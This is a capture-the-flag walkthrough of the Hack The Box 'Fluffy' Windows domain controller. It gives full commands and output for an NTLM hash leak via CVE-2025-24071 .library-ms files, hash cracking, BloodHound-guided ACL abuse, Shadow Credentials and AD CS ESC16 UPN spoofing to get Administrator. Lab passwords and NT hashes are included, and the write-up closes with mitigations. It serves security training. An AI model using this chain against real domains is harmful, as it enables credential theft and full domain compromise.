---
title: "HTB Walkthrough: Fluffy"
date: 2026-09-13
draft: false
description: "Full walkthrough of the Fluffy machine from Hack The Box. Easy difficulty, Windows Server 2019 Active Directory. CVE-2025-24071 NTLM hash leak via .library-ms in a ZIP, NetNTLMv2 cracking, BloodHound ACL abuse, Shadow Credentials, and AD CS ESC16 UPN spoofing to impersonate Administrator."
tags: ["HackTheBox", "Easy", "Windows", "ActiveDirectory", "SMB", "NTLM", "CVE-2025-24071", "BloodHound", "ShadowCredentials", "ADCS", "ESC16", "UPNSpoofing", "WinRM", "Certipy", "Responder", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Fluffy** on Hack The Box. **Easy** difficulty machine running **Windows Server 2019** as an Active Directory domain controller. A writable SMB share holds an `Upgrade_Notice.pdf` that points us to **CVE-2025-24071**: a `.library-ms` file inside a `.zip` forces outbound SMB authentication, leaking the NetNTLMv2 hash of `p.agila`, which cracks to a plaintext password. **BloodHound** reveals nested `GenericAll`/`GenericWrite` ACLs leading to **Shadow Credentials** attacks on service accounts. Finally, **AD CS ESC16** (security extension disabled on the CA) allows UPN spoofing to impersonate `Administrator`.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                                                                                          |
|----------------|---------------------------------------------------------------------------------------------------------------------------------|
| **Name**       | Fluffy                                                                                                                          |
| **OS**         | Windows Server 2019 (Domain Controller)                                                                                         |
| **Difficulty** | Easy                                                                                                                            |
| **IP**         | 10.129.232.88                                                                                                                   |
| **Techniques** | CVE-2025-24071 · NetNTLMv2 cracking · BloodHound ACL abuse · Shadow Credentials · AD CS ESC16 · UPN Spoofing · Pass-the-Hash  |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.232.88
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

> **💡 Attack surface:** The port set (Kerberos, LDAP, SMB, ADWS, WinRM) is characteristic of an **Active Directory domain controller**. All attack vectors go through AD protocols.

### 1.2 Service Version Scan

```bash
nmap -sC -sV -p389,636 10.129.232.88
```

```
389/tcp open  ldap  Microsoft Windows Active Directory LDAP
              (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: SAN: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

> **⚠️ Clock skew detected:** The ~7-hour skew will cause Kerberos authentication to fail until we sync our clock. We'll address this later when it becomes blocking.

---

## 2. SMB Enumeration

Using the initial credentials provided (`j.fleischman` : `J0elTHEM4n1990!`):

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!'
```

```
Disk        Permissions
----        -----------
ADMIN$      NO ACCESS
C$          NO ACCESS
IPC$        READ ONLY
IT          READ, WRITE
NETLOGON    READ ONLY
SYSVOL      READ ONLY
```

The `IT` share has **read and write** access. Listing its contents:

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' -r "IT"
```

```
Everything-1.4.1.1026.x64/
Everything-1.4.1.1026.x64.zip
KeePass-2.58/
KeePass-2.58.zip
Upgrade_Notice.pdf
```

> **💡 Key finding:** A writable share that IT staff presumably access, containing an `Upgrade_Notice.pdf` — worth reading before attempting any technical exploit.

---

## 3. Analyzing `Upgrade_Notice.pdf`

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --download "IT\Upgrade_Notice.pdf"
pdftotext 10.129.232.88-IT_Upgrade_Notice.pdf && cat 10.129.232.88-IT_Upgrade_Notice.txt
```

```
FLUFFY — Patch Announcement: Mandatory Timeslot Booking for Critical Updates

Recent Vulnerabilities
CVE ID              Severity
CVE-2025-24996       Critical
CVE-2025-24071       Critical
CVE-2025-46785       High
CVE-2025-29968       High
CVE-2025-21193       Medium
CVE-2025-3445        Low
```

> **💡 Key insight:** The IT department is advertising the CVEs they're concerned about — including **CVE-2025-24071**, which leaks NTLM hashes via a `.library-ms` file inside a `.zip`. We already have write access to the `IT` share that IT staff use.

---

## 4. CVE-2025-24071 — NTLM Leak via `.library-ms`

### 4.1 Vulnerability

A `.library-ms` file can declare a remote folder (`\\<attacker_ip>\share`) as part of a Windows "library." When Windows Explorer indexes or previews the `.zip`, it resolves that remote path — triggering an **outbound SMB authentication** with the user's NetNTLMv2 hash.

```
Normal flow:    user opens ZIP → Explorer previews contents locally
Malicious flow: ZIP contains .library-ms with remote UNC path
                → Explorer resolves \\<attacker>\share → SMB auth sent
                → attacker running Responder captures NetNTLMv2 hash
```

### 4.2 Generating the Payload

```bash
python3 cve_2025_24071.py -n test -i 10.10.15.193 -s IT
```

```
[+] Wrote ./test.library-ms
[+] Wrote ./test.zip
[+] Removed intermediate test.library-ms
[+] Done. Deliver ./test.zip to the target and get it extracted.
```

### 4.3 Delivering the Payload

```bash
smbclient '//10.129.232.88/IT' -U 'j.fleischman%J0elTHEM4n1990!'
smb: \> put test.zip
smb: \> exit
```

### 4.4 Capturing and Cracking the Hash

```bash
responder -I tun0
```

```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:ca1ffb03f3cc9670:15DBBA15...
```

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O --force
```

```
P.AGILA::FLUFFY:...:prometheusx-303
```

> **🔑 Credentials obtained:** `p.agila : prometheusx-303`

---

## 5. Active Directory Enumeration — BloodHound

```bash
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' \
    -dc 'dc01.fluffy.htb' -c all -ns 10.129.232.88
```

```
INFO: Found AD domain: fluffy.htb
INFO: Found 1 computers
INFO: Found 10 users
INFO: Found 54 groups
```

In BloodHound, we mark `p.agila` as *owned* and review **Outbound Object Control → Transitive Object Control**:

1. `p.agila` ∈ group **`Service Account Managers`**
2. `Service Account Managers` has **`GenericAll`** over group **`Service Accounts`**
3. `Service Accounts` has **`GenericWrite`** over `ca_svc`, `winrm_svc`, and `ldap_svc`
4. `winrm_svc` ∈ **`Remote Management Users`** → can authenticate via WinRM

> **💡 Attack path:** If we abuse `GenericAll` to add ourselves to `Service Accounts`, we inherit `GenericWrite` over service accounts. `GenericWrite` over a user object enables a **Shadow Credentials** attack — adding an alternative public-key credential without knowing or changing the password.

---

## 6. ACL Abuse and Shadow Credentials

### 6.1 Joining `Service Accounts`

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 \
    add groupMember 'service accounts' p.agila
```

```
[+] p.agila added to service accounts
```

```bash
echo "10.129.232.88 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
```

### 6.2 Shadow Credentials on `winrm_svc`

`GenericWrite` over a user object allows modifying its `msDS-KeyCredentialLink` attribute. By adding a public key we control, we authenticate as that account via **PKINIT** without knowing its password and recover its NT hash via U2U.

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```

```
NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

```
Normal flow:    authenticate with password → Kerberos TGT issued
Malicious flow: GenericWrite → add public key to msDS-KeyCredentialLink
                → PKINIT auth with our private key → U2U → NT hash without password
```

---

## 7. User Flag

```bash
evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
```

> 🔑 User flag obtained.

---

## 8. Privilege Escalation — AD CS ESC16

### 8.1 Finding the CA

```bash
nxc ldap 10.129.232.88 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
```

```
ADCS  Found PKI Enrollment Server: DC01.fluffy.htb
ADCS  Found CN: fluffy-DC01-CA
```

```bash
certipy find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
```

```
[!] Vulnerabilities
ESC16 : Security Extension is disabled.
```

> **⚠️ ESC16:** The CA has the `szOID_NTDS_CA_SECURITY_EXT` security extension disabled. This extension normally embeds the requester's SID in issued certificates. Without it, the domain controller falls back to **weak UPN-based mapping** — allowing impersonation of any account whose `userPrincipalName` we can match, including `Administrator`.

### 8.2 Getting the `ca_svc` NT Hash

First attempt fails due to the clock skew detected earlier:

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
# [-] KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
ntpdate 10.129.232.88
# CLOCK: time stepped by 1112.160389
```

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

```
NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

### 8.3 ESC16 Exploitation — UPN Spoofing

**Step 1 — Set `ca_svc` UPN to `administrator`:**

With `GenericWrite` over `ca_svc` we can modify its `userPrincipalName` directly:

```bash
certipy account update -username 'ca_svc@fluffy.htb' \
    -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -user ca_svc -upn 'administrator'
```

```
[*] Updated 'ca_svc':
    userPrincipalName : administrator
```

**Step 2 — Request a certificate while UPN is `administrator`:**

```bash
certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -target 'dc01.fluffy.htb' \
    -ca 'fluffy-DC01-CA' -template 'User'
```

```
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

```
Normal flow:    certificate includes SID → DC maps cert to account by SID
Malicious flow: ESC16 (no security extension) → DC maps cert to account by UPN
                → ca_svc UPN = "administrator" → cert issued as "administrator"
                → certipy auth → NT hash of Administrator
```

**Step 3 — Restore `ca_svc` UPN (cleanup):**

```bash
certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
    -user ca_svc -upn 'ca_svc@fluffy.htb'
```

**Step 4 — Authenticate with the certificate:**

```bash
certipy auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

> **🔑 Administrator NT hash obtained:** Pass-the-Hash to WinRM completes the escalation.

---

## 9. Root Flag

```bash
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

> 🏁 Root flag obtained.

---

## 10. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → SMB enumeration with `j.fleischman` reveals writable `IT` share.
2. **Intel gathering** → `Upgrade_Notice.pdf` lists CVE-2025-24071 as a critical pending patch.
3. **CVE-2025-24071** → `.library-ms` inside `test.zip` uploaded to `IT` share → Responder captures `p.agila` NetNTLMv2 hash → hashcat cracks to `prometheusx-303`.
4. **BloodHound** → `p.agila` → `GenericAll` on `Service Accounts` group → `GenericWrite` on service accounts including `winrm_svc`.
5. **Shadow Credentials** → `bloodyAD` adds `p.agila` to `Service Accounts` → `certipy shadow auto` on `winrm_svc` → NT hash → WinRM → `user.txt`.
6. **ESC16** → `certipy find` reveals security extension disabled on `fluffy-DC01-CA` → `ntpdate` fixes clock skew → Shadow Credentials on `ca_svc` → NT hash.
7. **UPN Spoofing** → `ca_svc` UPN set to `administrator` → `certipy req` with User template → certificate with UPN `administrator` → `certipy auth` → Administrator NT hash → WinRM → `root.txt`.

**What I learned from this machine:**

- **CVE-2025-24071 is a zero-interaction attack on Windows libraries.** The victim doesn't need to open the file or run anything — Windows Explorer automatically resolves `.library-ms` UNC paths during indexing. Write access to a shared folder used by IT staff is sufficient to harvest credentials from anyone who browses it.

- **A PDF from the IT department can be the best reconnaissance source.** The `Upgrade_Notice.pdf` named the exact CVE to exploit. In real engagements, internal documents often reveal what the target knows about its own vulnerabilities — always read files found in accessible shares before reaching for technical exploits.

- **BloodHound's transitive control analysis is essential for AD.** The `p.agila → Service Account Managers → Service Accounts → winrm_svc/ca_svc` chain would take significant manual enumeration without BloodHound's graph. Marking each compromised account as "owned" and following outbound paths is the standard workflow.

- **Shadow Credentials is a stealthy alternative to password changes.** `msDS-KeyCredentialLink` modification doesn't change the password, doesn't trigger "password changed" events, and doesn't lock the account. It's detectable only through specific monitoring of the attribute.

- **ESC16 is a CA-level misconfiguration, not a certificate template issue.** Unlike ESC1 (which requires an enrollable template with SAN control), ESC16 affects all certificates issued by the CA. Disabling the security extension retroactively weakens every certificate mapping on the domain.

- **Clock skew is not just a nuisance — it's a signal.** The `KRB_AP_ERR_SKEW` error on the first Shadow Credentials attempt on `ca_svc` was expected from the Nmap scan. In real environments, large clock skew on a DC often indicates misconfigured or suspended VMs — worth flagging as a finding in its own right.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Writable `IT` share for non-admin users | Least privilege on share ACLs; separate read-only distribution from upload shares |
| CVE-2025-24071 (`.library-ms` in `.zip`) | Apply Microsoft patch; filter `.library-ms` in share policy; block outbound NTLM |
| NetNTLMv2 crackable offline | Disable NTLM where possible; enforce Kerberos; strong passwords + SMB signing |
| Overly permissive AD ACLs (`GenericAll`/`GenericWrite` nested) | Audit ACLs regularly with BloodHound; avoid delegation chains ending on privileged accounts |
| Shadow Credentials (`msDS-KeyCredentialLink`) | Monitor attribute writes; restrict which principals can write it |
| ESC16 (security extension disabled, weak UPN mapping) | Enable `StrongCertificateBindingEnforcement`; restrict UPN modification |
| Elevated clock skew | Sync all hosts against a reliable NTP source |
